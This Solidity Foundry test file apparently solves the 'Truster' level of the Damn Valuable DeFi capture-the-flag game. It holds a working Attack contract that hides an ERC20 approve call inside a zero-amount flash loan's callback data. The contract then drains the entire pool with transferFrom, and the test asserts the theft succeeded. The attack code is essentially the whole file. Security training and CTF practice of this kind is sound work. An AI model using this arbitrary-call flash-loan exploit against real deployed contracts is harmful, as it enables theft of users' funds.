// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {DSTest} from "ds-test/test.sol";
import {Utilities} from "../../utils/Utilities.sol";
import {console} from "../../utils/Console.sol";
import {Vm} from "forge-std/Vm.sol";

import {DamnValuableToken} from "../../../Contracts/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../../Contracts/truster/TrusterLenderPool.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";

contract Attack {
    function attack(address pool_addr, address token_addr) public {
        TrusterLenderPool pool = TrusterLenderPool(pool_addr);
        IERC20 token = IERC20(token_addr);

        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            token.balanceOf(pool_addr)
        );
        pool.flashLoan(0, address(this), token_addr, data);
        token.transferFrom(pool_addr, msg.sender, token.balanceOf(pool_addr));
    }
}

contract Truster is DSTest {
    Vm internal immutable vm = Vm(HEVM_ADDRESS);

    uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;

    Utilities internal utils;
    TrusterLenderPool internal trusterLenderPool;
    DamnValuableToken internal dvt;
    address payable internal attacker;

    function setUp() public {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        trusterLenderPool = new TrusterLenderPool(address(dvt));
        vm.label(address(trusterLenderPool), "Truster Lender Pool");

        dvt.transfer(address(trusterLenderPool), TOKENS_IN_POOL);

        assertEq(dvt.balanceOf(address(trusterLenderPool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/
        vm.startPrank(attacker);
        console.log(
            "TrusterLenderPool Balance Before :",
            dvt.balanceOf(address(trusterLenderPool))
        );
        console.log("Attacker Balance Before :", dvt.balanceOf(attacker));
        console.log("Starting an Attack...");
        Attack attack_obj = new Attack();
        attack_obj.attack(address(trusterLenderPool), address(dvt));
        console.log(
            "TrusterLenderPool Balance After :",
            dvt.balanceOf(address(trusterLenderPool))
        );
        console.log("Attacker Balance After :", dvt.balanceOf(attacker));
        vm.stopPrank();
        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvt.balanceOf(address(trusterLenderPool)), 0);
        assertEq(dvt.balanceOf(address(attacker)), TOKENS_IN_POOL);
    }
}
